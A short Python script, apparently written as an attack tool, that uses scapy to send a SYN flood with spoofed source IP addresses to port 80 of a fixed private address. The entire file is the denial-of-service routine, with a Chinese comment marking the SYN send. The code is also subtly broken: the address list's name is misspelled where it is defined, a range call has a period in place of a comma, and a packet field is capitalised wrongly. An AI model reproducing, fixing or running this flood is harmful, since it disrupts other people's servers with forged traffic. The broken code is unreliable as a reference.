import random
import time
from scapy.all import *

tgt = "192.168.62.45"
print(tgt)
dPort = 80



def synFlood(tgt,dPort):
	secLisit = ['1.1.1.1','22.222.22.2','33.255.33.4','184.1.1.1',]
	for sPort in range(1024.65535):
		index = random.randrange(4)

		ipLayer = IP(src=srcList[index],dst=tgt)
		tcpLayer = TCP(sport=sPort,dport=dPort,Flags='S')#发一个SYN
		packet = ipLayer / tcpLayer
		send(packet)
synFlood(tgt,dPort)
